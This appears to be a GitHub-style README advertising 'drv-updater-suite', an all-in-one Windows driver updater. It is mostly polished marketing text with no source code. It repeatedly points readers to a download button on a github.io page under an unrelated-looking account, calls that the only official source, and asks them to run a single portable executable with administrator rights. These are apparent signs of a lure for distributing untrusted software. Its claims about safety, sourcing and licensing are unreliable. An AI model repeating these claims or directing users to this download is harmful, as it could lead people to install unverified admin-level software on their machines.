<div align="center">

<img src="assets/banner.svg" width="100%" alt="Driver Updater All In One banner"/>

# drv-updater-suite 🚀🛡️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*One suite, every driver, zero guesswork — keep Windows running at full throttle.*

<p align="center">
  <a href="https://barbaeromanceradapt.github.io/drv-updater-suite/">
    <img src="https://img.shields.io/badge/GET-Driver_Updater_All--in--One_2026-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## 🧭 Overview

**TL;DR:** drv-updater-suite finds outdated, missing, and broken drivers, then fixes them — automatically, safely, in one pass.

Windows is a patchwork of silicon from a dozen vendors, and every one of them ships drivers on their own schedule, in their own installer, with their own idea of what "latest" means. **drv-updater-suite** exists to erase that chaos. It scans your motherboard, GPU, chipset, audio, network, storage controllers, and peripherals, cross-references them against a continuously refreshed catalog, and surfaces exactly what's stale — no vendor-hopping across five different tray apps, no guessing which `.inf` actually matches your hardware ID.

This is a **driver updater all-in-one** built for people who don't want driver maintenance to be a hobby: gamers chasing every last frame, IT technicians provisioning fleets of machines, builders bringing a fresh install up to spec, and anyone who's ever watched Device Manager throw a yellow triangle and sighed. The suite favors precision over noise — it targets the exact driver package for your exact hardware revision, not a generic "works probably" bundle.

Under the hood it's a single self-contained Windows application. No background services eating RAM, no forced telemetry, no bundled toolbars. You open it, it scans, you review, you apply. That's the whole contract.

## ⬇️ Get It

<p align="center">

<a href="https://barbaeromanceradapt.github.io/drv-updater-suite/">
    <img src="https://img.shields.io/badge/GET-Driver_Updater_All--in--One_2026-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
  </a>

</p>

> [!NOTE]
> The button above is the only official download source. The landing page always serves the current build.

---

## ⚡ What It Actually Does

**TL;DR:** deep hardware scanning, safe rollback, silent batch updates, and a UI that respects your time.

- **Full hardware fingerprinting** — reads vendor ID, device ID, and subsystem revision straight from the registry, so it never matches a driver to the wrong chip stepping.

- **One-click batch updates** — queue every outdated driver and apply them in a single sequenced pass, with automatic reboots only when actually required.

- **Rollback safety net** — every install creates a restore point first, so a bad driver is one click away from undone, not a weekend project.

- **Offline package caching** — download once, install on multiple machines without re-fetching, ideal for techs servicing several PCs a day.

- **Conflict detection** — flags when two candidate drivers fight over the same device and lets you pick, instead of silently choosing for you.

- **Silent/unattended mode** — scriptable flags for IT deployments that need zero user interaction.

- **Backup vault** — exports your entire current driver set to a folder before any change, so you always have an exit door.

- **Vendor-aware sourcing** — pulls from manufacturer channels rather than generic repositories, reducing mismatched or region-locked packages.

> [!TIP]
> Run a backup export before your first big update batch. It takes seconds and it's the difference between "oops" and "no problem."

---

## 🏁 How to Get Started

**TL;DR:** download, launch, scan, apply — four steps, no dependencies.

1. **Visit the landing page** via the download button above.

2. **Download the suite** — a single portable executable, no installer wizard required.

3. **Launch and scan** — the app enumerates your hardware and checks driver versions in seconds.

4. **Review and apply** — approve the updates you want, or hit "Update All" and walk away.

> [!IMPORTANT]
> Close any GPU overlay or capture software before applying graphics driver updates — some overlays lock driver files mid-install.

---

## 🖥️ System Requirements

**TL;DR:** any Windows 10/11 PC, no extra software needed.

| Requirement | Details |
|---|---|
| OS | Windows 10 (21H2+) or Windows 11 |
| Architecture | x64 / ARM64 |
| RAM | 4 GB minimum, 8 GB recommended |
| Disk | 300 MB free for cache + backups |
| Dependencies | None — fully standalone binary |
| Admin rights | Required for driver installation |

![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen?style=flat-square) ![Build](https://img.shields.io/badge/build-passing-success?style=flat-square) ![Arch](https://img.shields.io/badge/arch-x64%20%7C%20ARM64-informational?style=flat-square)

---

## 🔬 How It Works

**TL;DR:** scan hardware → match catalog → download → verify → install, with rollback at every step.

1. **Enumeration** — the suite reads every device node in Windows and extracts its hardware ID.

2. **Catalog match** — each ID is matched against a curated, versioned driver database.

3. **Staged download** — only mismatched or outdated packages are pulled, verified by checksum.

4. **Controlled install** — Windows Update Session APIs apply drivers in dependency-safe order.

5. **Verification** — post-install, the device is re-queried to confirm the new version actually loaded.

```mermaid
flowchart LR
    Scan --> Match
    Match --> Download
    Download --> Install
    Install --> Verify
```

> [!WARNING]
> Never power off mid-install during a chipset or storage controller driver update — interrupting this stage can leave a device node in a broken state.

---

## 🧩 Troubleshooting

**TL;DR:** most issues trace back to permissions, overlays, or stale cache — here's the fast fix.

<details>
<summary><strong>The scan finds "Unknown Device" and won't match a driver</strong></summary>

Unknown devices usually mean Windows is missing the base PCI/USB descriptor. Try a Windows Update pass first, then re-scan — the suite needs at least a partial hardware ID to work with.

</details>

<details>
<summary><strong>An update fails and rolls itself back</strong></summary>

That's the safety net working as designed. Check the log panel for the exact error — most commonly it's a locked file because an app (browser, capture tool) is using the device.

</details>

<details>
<summary><strong>GPU driver install causes a black screen</strong></summary>

Reboot into Safe Mode, open the suite, and use "Restore Previous Driver" from the backup vault. This is exactly what the vault exists for.

</details>

<details>
<summary><strong>The app says "Administrator privileges required"</strong></summary>

Right-click the executable and choose "Run as administrator." Driver installation is a privileged Windows operation — there's no way around it.

</details>

<details>
<summary><strong>Batch update seems stuck on one device</strong></summary>

Some network adapter drivers momentarily drop the connection mid-install — this is normal. Give it 60 seconds before assuming it's frozen.

</details>

---

## 🎨 UI / UX Details

**TL;DR:** dark by default, keyboard-friendly, and configurable without digging through menus.

- **Themes** — Dark (default), Light, and High-Contrast for accessibility.

- **Keyboard shortcuts:**

  | Action | Shortcut |
  |---|---|
  | Start scan | `Ctrl+R` |
  | Update all | `Ctrl+U` |
  | Open backup vault | `Ctrl+B` |
  | Toggle silent mode | `Ctrl+Shift+S` |
  | Open logs | `Ctrl+L` |

- **Settings panel** — cache location, auto-scan interval, notification preferences, and update channel (stable/beta) all live in one screen.

- **Compact mode** — collapses the device list into a minimal tray-friendly window for background monitoring.

> [!TIP]
> Enable auto-scan interval in Settings if you manage several PCs — it'll flag stale drivers before you even open the app.

---

## 🤝 Contributing & Community

**TL;DR:** issues, PRs, and driver-catalog suggestions are welcome — this project grows with its users.

> Found a device the suite doesn't recognize? Open an issue with the hardware ID and we'll investigate the catalog entry.

- Bug reports and feature requests → GitHub Issues
- Pull requests → please open a discussion first for anything beyond a small fix
- Catalog corrections (wrong/outdated driver mapping) are especially valuable — flag them directly

---

## 📄 License

**TL;DR:** MIT, 2026 — use it, fork it, ship it.

Released under the [MIT License](LICENSE).

---

## ⚠️ Disclaimer

**TL;DR:** use at your own risk; always keep backups before touching system drivers.

> Driver installation modifies core system components. While rollback and backup features are built in, always ensure critical data is backed up separately before major driver operations. This project is provided "as is," without warranty of any kind.

---

<p align="center">

<a href="https://barbaeromanceradapt.github.io/drv-updater-suite/">
    <img src="https://img.shields.io/badge/GET-Driver_Updater_All--in--One_2026-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
  </a>

</p>